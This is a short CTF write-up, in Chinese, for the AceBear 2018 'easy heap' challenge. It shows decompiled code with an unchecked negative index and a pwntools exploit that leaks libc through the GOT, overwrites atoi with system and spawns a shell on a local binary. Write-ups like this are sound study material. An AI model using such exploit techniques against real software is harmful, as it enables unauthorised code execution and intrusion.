# AceBear Security Contest 2018 - Notes

## easy heap

先丟 ida pro ，然後我們可以看一下 show_name()

```c
int show_name()
{
  int result; // eax@2
  int idx; // [sp+Ch] [bp-Ch]@1

  printf("Index: ");
  idx = read_number();
  if ( idx <= 9 )
  {
    if ( *(&buf + idx) )
    {
      printf("This name %d is: %s\n", idx, *(&buf + idx));
      result = puts("Done!");
    }
    else
    {
      result = puts("None name");
    }
  }
  else
  {
    result = puts("Out of list name (0 <= index < 10)!!!");
  }
  return result;
}
```

她會用 %s 去印該地址的資料，所以這邊可以去 leak got 來算 libc addr

而且他沒檢查負數，然後看組語他是 ```DWORD PTR [eax*4+0x804b0a0]```

所以也有 integer overflow


然後利用 edit_name() 可以對記憶體做寫

```python
#!/usr/bin/env python
from pwn import *
context.arch = 'i386'
r = process('/tmp/p/a')

def send_name_age(name, age):
	r.sendlineafter('name: ', name)
	r.sendlineafter('age: ', age)

def create_name(idx, name):
	r.sendlineafter('choice: ', str(1))
	r.sendlineafter(': ', str(idx))
	r.sendlineafter(': ', name)

def edit_name(idx, name):
	r.sendlineafter('choice: ', str(2))
	r.sendlineafter(': ', str(idx))
	r.sendlineafter(': ', name)

def delete_name(idx):
	r.sendlineafter('choice: ', str(3))
	r.sendlineafter(': ', str(idx))

def show_name(idx):
	r.sendlineafter('choice: ', str(4))
	r.sendlineafter(': ', str(idx))


## buf = 0x804B0A0
## name = 0x804B0E0
printf_got = 0x0804b014
atoi_got = 0x0804b038
atoi_off = 0x002d3c0
leak = -1073741808
name = flat([ atoi_got ])
send_name_age(name,"test")
print r.recvuntil('Your')

show_name(leak)
r.recvuntil('-1073741808 is: ')
libc = u32(r.recvline()[:4]) - atoi_off
log.info("libc: %x" % libc)
system = libc + 0x0003b060
edit_name(leak, p32(system))
r.sendlineafter('choice: ','sh')

r.interactive()

```


